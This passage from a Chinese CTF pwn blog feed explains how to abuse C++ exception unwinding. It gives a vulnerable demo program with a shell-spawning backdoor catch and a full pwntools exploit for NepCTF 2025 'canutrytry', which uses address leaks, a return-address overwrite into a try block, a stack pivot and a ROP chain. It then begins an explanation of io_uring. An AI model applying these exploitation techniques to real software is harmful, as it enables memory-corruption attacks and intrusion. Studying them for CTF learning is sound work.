2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;修改retaddr，调用其他catch&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;// exception.cpp&#xA;// g&amp;#43;&amp;#43; exception.cpp -o exc -no-pie -fPIC&#xA;#include &amp;lt;stdio.h&amp;gt;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xA; &#xA;void backdoor()&#xA;{&#xA;    try&#xA;    {&#xA;        printf(&amp;#34;We have never called this backdoor!&amp;#34;);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[!] Backdoor has catched the exception: %s\n&amp;#34;, s);&#xA;        system(&amp;#34;/bin/sh&amp;#34;);&#xA;    }&#xA;}&#xA;&#xA;class x&#xA;{&#xA;public:&#xA;    char buf[0x10];&#xA;    x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:x() called!\n&amp;#34;);&#xA;    }&#xA;    ~x(void)&#xA;    {&#xA;        // printf(&amp;#34;x:~x() called!\n&amp;#34;);&#xA;    }&#xA;};&#xA; &#xA;void test()&#xA;{&#xA; x tmp;&#xA; printf(&amp;#34;[!] enter your input:&amp;#34;);&#xA; fflush(stdout);&#xA; int count = 0x100;&#xA; size_t len = read(0, tmp.buf, count);&#xA; if (len &amp;gt; 0x10)&#xA; {&#xA;     throw &amp;#34;Buffer overflow.&amp;#34;;&#xA; }&#xA; printf(&amp;#34;[&amp;#43;] test() return.\n&amp;#34;);&#xA;}&#xA; &#xA;void input()&#xA;{&#xA; try&#xA; {&#xA;     test();&#xA; }&#xA; catch (const char *s)&#xA; {&#xA;     printf(&amp;#34;[-] String(From input): %s\n&amp;#34;, s);&#xA; }&#xA; printf(&amp;#34;[&amp;#43;] input() return.\n&amp;#34;);&#xA;}&#xA; &#xA;int main()&#xA;{&#xA;    try&#xA;    {&#xA;        input();&#xA;        printf(&amp;#34;--------------------------------------\n&amp;#34;);&#xA;        throw 1;&#xA;    }&#xA;    catch (int x)&#xA;    {&#xA;        printf(&amp;#34;[-] Int: %d\n&amp;#34;, x);&#xA;    }&#xA;    catch (const char *s)&#xA;    {&#xA;        printf(&amp;#34;[-] String: %s\n&amp;#34;, s);&#xA;    }&#xA;    printf(&amp;#34;[&amp;#43;] main() return.\n&amp;#34;);&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里，我们发送&lt;code&gt;pl1&lt;/code&gt;，就能调用到&lt;code&gt;backdoor&lt;/code&gt;函数里的catch&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pl = pad &amp;#43; p64(0x404050-0x8)#puts_got -8&#xA;pl1 =  b&amp;#39;a&amp;#39;*0x30&amp;#43; p64(0x404050-0x8) &amp;#43; p64(0x401292&amp;#43;1)#backdoor_addr &amp;#43; 1&#xA;&#xA;p.sendafter(b&amp;#39;input:&amp;#39;,pl1)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;pl1&lt;/code&gt;把&lt;code&gt;input&lt;/code&gt;函数的返回地址改成了&lt;code&gt;backdoor_addr + 1&lt;/code&gt;，而抛出异常是在&lt;code&gt;input&lt;/code&gt;函数里抛出的，此时的调用链就变成了&lt;code&gt;input&lt;/code&gt; -&amp;gt; &lt;code&gt;backdoor&lt;/code&gt;，&lt;code&gt;input&lt;/code&gt;中没有找到对应的handler，&lt;code&gt;backdoor&lt;/code&gt;中有，就去执行&lt;code&gt;backdoor&lt;/code&gt;里的了&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;为什么需要把&lt;code&gt;backdoor_addr&lt;/code&gt;去加1？返回地址需要在backdoor函数try区域内，demo2中的范围是(0x401293,0x401297]&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;nepctf-2025-canutrytry&#34;&gt;&lt;span&gt;NepCTF 2025 canutrytry&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#nepctf-2025-canutrytry&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;修改rbp控制程序执行流+修改retaddr调用其他catch+栈迁移&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;逆向分析&#34;&gt;&lt;span&gt;逆向分析&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#xA;{&#xA;  int v3; // [rsp&amp;#43;4h] [rbp-2Ch] BYREF&#xA;  unsigned __int64 v4; // [rsp&amp;#43;18h] [rbp-18h]&#xA;&#xA;  v4 = __readfsqword(0x28u);&#xA;  init();&#xA;  while ( 1 )&#xA;  {&#xA;    while ( 1 )&#xA;    {&#xA;      menu();&#xA;      std::istream::operator&amp;gt;&amp;gt;(&amp;amp;std::cin, &amp;amp;v3);&#xA;      if ( v3 != 1 )&#xA;        break;&#xA;      visit();&#xA;    }&#xA;    if ( v3 != 2 )&#xA;      exit(0);&#xA;    leave();&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在&lt;code&gt;init&lt;/code&gt;中：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;开了沙箱，只允许四个系统调用，&lt;code&gt;read&lt;/code&gt;、&lt;code&gt;write&lt;/code&gt;、&lt;code&gt;close&lt;/code&gt;、&lt;code&gt;futex&lt;/code&gt;，&lt;/li&gt;&#xA;&lt;li&gt;打开了flag，把flag读到0x4053c0&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;提供两个选项&lt;code&gt;visit&lt;/code&gt;和&lt;code&gt;leave&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;**&lt;code&gt;visit&lt;/code&gt;**中提供三个选项：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;**left：**根据size_list申请堆块&lt;/li&gt;&#xA;&lt;li&gt;**right：**讲size写入size_list数组&lt;/li&gt;&#xA;&lt;li&gt;**stright：**输入index，往相应堆块中读入数据&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;leave：&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入index，把堆块内容复制到栈中**（这里存在栈溢出）**，如果size大于0x10，就抛出异常&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;异常处理：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;抛出异常：&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;visit中的left如果检查到size小于等于0,就会抛出**&amp;ldquo;invalid size&amp;rdquo;**&lt;/li&gt;&#xA;&lt;li&gt;leave中如果检测到size大于0x10就会抛出**&amp;ldquo;stack overflow&amp;rdquo;**&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;leave&lt;/code&gt;和&lt;code&gt;visit&lt;/code&gt;中都没有&lt;code&gt;catch&lt;/code&gt;，&lt;code&gt;main&lt;/code&gt;中有两个&lt;code&gt;catch(char const*)&lt;/code&gt;，抛出异常后都会stack unwinding，然后到main中处理&lt;/p&gt;&#xA;&lt;p&gt;其中一个catch会泄露libc地址和栈地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;....&#xA;mov     rax, cs:setbuf_ptr&#xA;mov     rsi, rax&#xA;lea     rax, format     ; &amp;#34;setbufaddr:%p\n&amp;#34;&#xA;mov     rdi, rax        ; format&#xA;mov     eax, 0&#xA;call    _printf&#xA;lea     rax, [rbp&amp;#43;var_2C]&#xA;mov     rsi, rax&#xA;lea     rax, aStackaddrP ; &amp;#34;stackaddr:%p\n&amp;#34;&#xA;mov     rdi, rax        ; format&#xA;mov     eax, 0&#xA;call    _printf&#xA;;   } // starts at 401FAD&#xA;call    ___cxa_end_catch&#xA;jmp     loc_401ED4&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;抛出异常的时候并不会调用另一个catch：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;loc_401F2B:             ; void *&#xA;mov     rdi, rax&#xA;call    ___cxa_begin_catch&#xA;mov     [rbp&amp;#43;var_20], rax&#xA;;   try {&#xA;call    write_shellcode&#xA;;   } // starts at 401F37&#xA;nop&#xA;call    ___cxa_end_catch&#xA;call    enterflag_writerbp&#xA;mov     eax, 0&#xA;mov     rdx, [rbp&amp;#43;var_18]&#xA;sub     rdx, fs:28h&#xA;jz      loc_402060&#xA;loc_402060:&#xA;mov     rbx, [rbp&amp;#43;var_8]&#xA;leave&#xA;retn&#xA;; } // starts at 401EB3&#xA;main endp&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;enterflag_writerbp&lt;/code&gt;中的另一个catch就是执行leave;ret（给了栈迁移的思路）&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/C&amp;#43;&amp;#43;pwn/canutrytry/catch.png&#34; title=&#34;图片显示错误&#34; data-thumbnail=&#34;/img/C&amp;#43;&amp;#43;pwn/canutrytry/catch.png&#34; data-sub-html=&#34;&lt;h2&gt;图片显示错误&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/C++pwn/canutrytry/catch.png&#39; alt=&#34;图片显示错误&#34; height=&#34;800px&#34; width=&#34;800px&#34;&gt;&lt;/a&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;思路过程&#34;&gt;&lt;span&gt;思路过程&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af%e8%bf%87%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;首先，泄露出libc和栈地址&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;leave中栈溢出写retaddr为这个try内的地址（就能去调用到那个不会被调用到的catch）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.text:0000000000401ED4 ;   try {&#xA;.text:0000000000401ED4                 call    menu&#xA;.text:0000000000401ED4 ;   } // starts at 401ED4&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;接着写入rop链，栈迁移到这里执行rop链&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    bp 0x4019d1&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;192.168.0.1&amp;#34;,8000 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # pause()&#xA;&#xA;def cmd(choice):&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,str(choice).encode())&#xA;&#xA;def leave(index):&#xA;    cmd(2)&#xA;    p.sendlineafter(b&amp;#39;index: &amp;#39;,str(index).encode())&#xA;&#xA;def left():&#xA;    cmd(1)&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,b&amp;#39;1&amp;#39;)&#xA;&#xA;def right(size):&#xA;    cmd(1)&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,b&amp;#39;2&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;size:&amp;#39;,str(size).encode())&#xA;&#xA;def stright(index,content):&#xA;    cmd(1)&#xA;    p.sendlineafter(b&amp;#39;&amp;gt;&amp;gt;&amp;#39;,b&amp;#39;3&amp;#39;)&#xA;    p.sendlineafter(b&amp;#39;index:&amp;#39;,str(index))&#xA;    p.sendafter(b&amp;#39;content:&amp;#39;,content)&#xA;&#xA;&#xA;right(0x30)&#xA;right(-1)&#xA;left()&#xA;left()&#xA;p.recvuntil(b&amp;#39;setbufaddr:&amp;#39;)&#xA;libc.address = int(p.recv(14),16) - 0x88060&#xA;p.recvuntil(b&amp;#39;stackaddr:&amp;#39;)&#xA;stack = int(p.recv(14),16)&#xA;success(&amp;#34;libc -&amp;gt; 0x%x&amp;#34;,libc.address)&#xA;success(&amp;#34;stack -&amp;gt; 0x%x&amp;#34;,stack)&#xA;pl = b&amp;#39;a&amp;#39;*0x20 &amp;#43; p64(stack-0x14) &amp;#43; p64(0x401ED4&amp;#43;1) #不能破坏栈&#xA;stright(0,pl)&#xA;leave(0)&#xA;&#xA;#进入另一个catch&#xA;p.recvuntil(b&amp;#39;now!\n&amp;#39;)&#xA;#write(2,0x4053c0,0x20)&#xA;flag_addr = 0x4053c0&#xA;#shellcode_addr = 0x405460&#xA;pop_rax_ret = 0x45eb0 &amp;#43; libc.address&#xA;pop_rdi_ret = 0x2a3e5&amp;#43; libc.address&#xA;pop_rsi_ret = 0x2be51  &amp;#43; libc.address&#xA;pop_rdx_r12_ret = 0x11f497&amp;#43; libc.address&#xA;rop = p64(0xdeedbeef)&#xA;rop &amp;#43;= p64(pop_rdi_ret) &amp;#43; p64(2)&#xA;rop &amp;#43;= p64(pop_rsi_ret) &amp;#43; p64(flag_addr)&#xA;rop &amp;#43;= p64(pop_rdx_r12_ret) &amp;#43; p64(0x100)*2&#xA;rop &amp;#43;= p64(libc.symbols[&amp;#39;write&amp;#39;])&#xA;&#xA;p.send(rop)&#xA;&#xA;# pl = p64(0x405460)&#xA;pl = b&amp;#39;flag&amp;#39;&#xA;p.sendafter(b&amp;#39;flag: &amp;#39;,pl) #0x405400 -&amp;gt; 0x405460(rop)&#xA;&#xA;&#xA;pl = b&amp;#39;a&amp;#39;*0x10 &amp;#43; p64(0x405460)&#xA;# dbg()&#xA;p.send(pl)&#xA;&#xA;p.interactive()&#xA;# 0x0000000000045eb0 : pop rax ; ret&#xA;# 0x000000000002a3e5 : pop rdi ; ret&#xA;# 0x000000000002be51 : pop rsi ; ret&#xA;# 0x000000000011f497 : pop rdx ; pop r12 ; ret&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;《C++.Primer.5th.Edition_2013》&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://en.cppreference.com/w/cpp/language/try.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://en.cppreference.com/w/cpp/language/try.html&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-284745.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bbs.kanxue.com/thread-284745.htm&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://c-lby.top/2024/cpp-exception/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;C++异常处理机制及其利用研究&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>io_uring</title>
      <link>http://localhost:1313/posts/io_uring/</link>
      <pubDate>Sat, 23 Aug 2025 13:56:19 +0800</pubDate>
      <guid>http://localhost:1313/posts/io_uring/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;p&gt;突破沙箱规则，实现orw&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;基础知识&#34;&gt;&lt;span&gt;基础知识&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;io_uring&lt;/code&gt;涉及三个系统调用&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;io_uring_setup(2)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;io_uring_register(2)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;io_uring_enter(2)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;io_uring_setup&#34;&gt;&lt;span&gt;&lt;code&gt;io_uring_setup&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#io_uring_setup&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;用于初始化执行异步IO的上下文&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;       #include &amp;lt;liburing.h&amp;gt;&#xA;&#xA;       int io_uring_setup(u32 entries, struct io_uring_params *p);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个系统调用&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;创建一个 SQ 和一个 CQ&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;返回一个文件描述符，随后作为其他相关系统调用的参数&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。&lt;/p&gt;&#xA;&lt;p&gt;参数：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;entries&lt;/code&gt;参数：&#xA;设置SQ和CQ的初始容量&lt;strong&gt;至少&lt;/strong&gt;为&lt;code&gt;entries&lt;/code&gt;（至少是因为&lt;code&gt;entries&lt;/code&gt;必须是2的幂次方（如32、64、512等），如果不是内核也会&lt;strong&gt;自动对齐到最近的更大幂次值&lt;/strong&gt;（如传入100会被调整为128））&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;io_uring_params&lt;/code&gt;结构体：&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;一般都是把&lt;code&gt;io_uring_params&lt;/code&gt;初始化然后清零，再传入&lt;code&gt;io_uring_setup&lt;/code&gt;，内核再将一些返回的信息写入这个结构体&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct io_uring_params {&#xA;    __u32 sq_entries;          // 实际提交队列（SQ）大小&#xA;    __u32 cq_entries;          // 实际完成队列（CQ）大小&#xA;    __u32 flags;               // 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式&#xA;    __u32 sq_thread_cpu;       // SQ polling 线程绑定的 CPU&#xA;    __u32 sq_thread_idle;      // SQ polling 线程空闲休眠时间&#xA;    __u32 features;            // 内核支持的特性标志&#xA;    __u32 wq_fd;               // 共享 workqueue 的 io_uring 实例 fd&#xA;    __u32 resv[3];             // 保留字段,必须为0&#xA;    struct io_sqring_offsets sq_off;   // SQ 环形队列的偏移信息&#xA;    struct io_cqring_offsets cq_off;   // CQ 环形队列的偏移信息&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;struct io_sqring_offsets {&#xA;    __u32 head;        // SQ 的 head 指针（用户态消费，内核读取）&#xA;    __u32 tail;        // SQ 的 tail 指针（用户态生产，内核读取）&#xA;    __u32 ring_mask;   // 环大小掩码，用于索引取模&#xA;    __u32 ring_entries;// SQ ring 的 entry 总数&#xA;    __u32 flags;       // SQ 状态标志位&#xA;    __u32 dropped;     // 内核丢弃的 SQE 数量&#xA;    __u32 array;       // SQE 索引数组（存放 SQE 的顺序）&#xA;    __u32 resv1;       // 保留字段&#xA;    __u64 user_addr;   // 用户自定义地址（较新内核引入）&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;struct io_cqring_offsets {&#xA;    __u32 head;        // CQ 的 head 指针（用户态消费）&#xA;    __u32 tail;        // CQ 的 tail 指针（内核生产）&#xA;    __u32 ring_mask;   // 环大小掩码，用于索引取模&#xA;    __u32 ring_entries;// CQ ring 的 entry 总数&#xA;    __u32 overflow;    // CQ 溢出计数&#xA;    __u32 cqes;        // CQE 数组起始偏移&#xA;    __u32 flags;       // CQ 状态标志&#xA;    __u32 resv1;       // 保留&#xA;    __u64 user_addr;   // 用户自定义地址&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;io_uring_enter&#34;&gt;&lt;span&gt;&lt;code&gt;io_uring_enter&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#io_uring_enter&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 